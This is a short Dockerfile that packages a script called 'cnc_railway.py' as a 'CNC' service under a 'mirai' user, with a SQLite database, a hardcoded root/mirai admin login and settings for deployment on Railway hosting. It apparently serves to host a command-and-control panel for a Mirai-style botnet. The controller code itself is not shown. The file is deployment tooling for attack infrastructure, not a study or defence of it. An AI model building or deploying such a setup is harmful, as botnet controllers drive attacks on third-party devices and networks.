FROM python:3.11-slim

# install only what's needed
RUN apt-get update -qq && \
    apt-get install -y -qq --no-install-recommends \
    sqlite3 procps net-tools iptables && \
    rm -rf /var/lib/apt/lists/*

# create non-root user (Railway compatibility)
RUN useradd -r -s /bin/false mirai && \
    mkdir -p /data /home/mirai && \
    chown -R mirai:mirai /data /home/mirai

# copy CNC
COPY cnc_railway.py /home/mirai/cnc.py
RUN chmod +x /home/mirai/cnc.py

# Railway $PORT
ENV PORT=8080
ENV DB_PATH=/data/mirai.db
ENV ADMIN_USER=root
ENV ADMIN_PASS=mirai

USER mirai
WORKDIR /home/mirai

# health check — pings the web panel every 30s
HEALTHCHECK --interval=30s --timeout=5s --start-period=10s --retries=3 \
    CMD python3 -c "import urllib.request; urllib.request.urlopen('http://localhost:${PORT}/')" || exit 1

EXPOSE ${PORT}

CMD ["python3", "/home/mirai/cnc.py"]
